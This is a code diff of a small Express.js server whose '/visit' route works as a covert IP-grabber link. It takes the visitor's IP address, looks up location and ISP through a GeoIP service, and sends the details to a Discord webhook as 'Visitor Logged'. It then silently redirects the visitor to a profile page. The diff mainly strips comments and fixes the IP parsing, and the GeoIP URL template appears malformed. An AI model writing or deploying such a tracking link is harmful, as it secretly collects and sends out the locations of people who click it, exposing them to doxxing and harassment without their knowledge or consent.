@@ -2,19 +2,16 @@ const express = require('express');
 const axios = require('axios');
 const app = express();
 
-// Pulls safely from your Render environment configuration
 const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK;
-const REDIRECT_URL = process.env.REDIRECT_URL || 'https://guns.lol'; 
+const REDIRECT_URL = process.env.REDIRECT_URL || 'https://guns.lol/xsaint'; 
 
 app.get('/visit', async (req, res) => {
-    // 1. Extract visitor IP address
     let clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
     
     if (clientIp && clientIp.includes(',')) {
-        clientIp = clientIp.split(',').trim();
+        clientIp = clientIp.split(',')[0].trim();
     }
 
-    // Local testing fallback
     if (clientIp === '::1' || clientIp === '127.0.0.1') {
         clientIp = '8.8.8.8'; 
     }
@@ -23,16 +20,14 @@ app.get('/visit', async (req, res) => {
 
     if (DISCORD_WEBHOOK_URL) {
         try {
-            // 2. Query the GeoIP API
             const geoResponse = await axios.get(`http://ip-api.com{clientIp}?fields=61439`);
             const geoData = geoResponse.data;
 
-            // 3. Clean, Minimalist Red Embed
             const discordPayload = {
                 embeds: [{
                     title: "Visitor Logged",
-                    color: 15548997, // Discord Red Color
-                    description: `A user has accessed the tracking link.`,
+                    color: 15548997, 
+                    description: "A user has accessed the tracking link.",
                     fields: [
                         { name: "IP Address", value: `\`${clientIp}\``, inline: true },
                         { name: "ISP Network", value: `\`${geoData.isp || "Unknown"}\``, inline: true },
@@ -46,7 +41,6 @@ app.get('/visit', async (req, res) => {
                 }]
             };
 
-            // 4. Send directly to your webhook
             axios.post(DISCORD_WEBHOOK_URL, discordPayload).catch(err => {
                 console.error("Webhook Delivery Failed:", err.message);
             });
@@ -58,7 +52,6 @@ app.get('/visit', async (req, res) => {
         console.warn("Configuration Error: DISCORD_WEBHOOK variable is missing.");
     }
 
-    // 5. Instantly redirect
     res.redirect(302, REDIRECT_URL);
 });
 
